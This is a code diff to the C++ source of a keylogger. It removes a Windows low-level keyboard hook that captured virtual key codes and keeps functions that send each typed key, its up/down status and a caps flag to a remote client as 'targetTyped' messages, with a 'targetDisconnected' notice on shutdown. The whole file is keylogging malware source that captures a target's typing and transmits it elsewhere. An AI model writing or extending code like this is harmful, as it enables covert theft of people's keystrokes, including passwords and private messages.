@@ -1,40 +1,16 @@
 #include "keylogger.h"
 
+keylogger::keylogger() : client(&validation_function) {}
 
-keylogger::keylogger()
-    : hook(SetWindowsHookExA(WH_KEYBOARD_LL, &keylogger::lowLevelKeyboardProc, NULL, 0)),
-    client(&validation_function)
-{
-    
-}
-keylogger::~keylogger()
-{
-    if (hook != NULL)
-        UnhookWindowsHookEx(hook);
-
+keylogger::~keylogger() {
     kq::message<messageType> msg(messageType::targetDisconnected);
     client.Send(msg);
     client.Disconnect();
 }
 
-void keylogger::handleKeyStroke(DWORD virtualKeyCode, keyStatus status)
-{
+void keylogger::handleKeyStroke(DWORD virtualKeyCode, keyStatus status,
+                                bool caps) {
     kq::message<messageType> msg(messageType::targetTyped);
-    msg << virtualKeyCode << status;
+    msg << virtualKeyCode << status << caps;
     client.Send(msg);
 }
-
-LRESULT CALLBACK keylogger::lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    static bool caps;
-    
-    if (nCode >= 0 ) {
-        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
-        DWORD virtualKeyCode = kbdStruct->vkCode;
-        keyStatus status = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) ? keyStatus::keyDown : keyStatus::keyUp;
-        transKeys.handleKeyStroke(virtualKeyCode, status);
-    }
-
-
-    return CallNextHookEx(NULL, nCode, wParam, lParam);
-}
-
